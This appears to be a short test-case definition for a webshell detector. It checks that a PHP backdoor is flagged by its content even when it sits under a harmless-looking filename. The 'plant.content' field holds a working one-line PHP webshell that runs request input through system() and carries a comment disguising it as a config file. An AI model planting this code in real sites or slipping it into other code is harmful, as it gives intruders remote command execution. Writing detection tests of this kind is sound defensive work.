name: initial_access_webshell
description: Initial access through a web application: a shell dropped into the document root, and a second copy under a name that reads as legitimate. The claim under test is detection by CONTENT rather than by filename — an intruder does not call the file shell.php.

plant.content:
<?php
// looks like a config file
if(isset($_REQUEST['x'])){ system($_REQUEST['x']); }
?>

expect.id: a webshell under an innocuous filename is FLAGGED (content, not name)
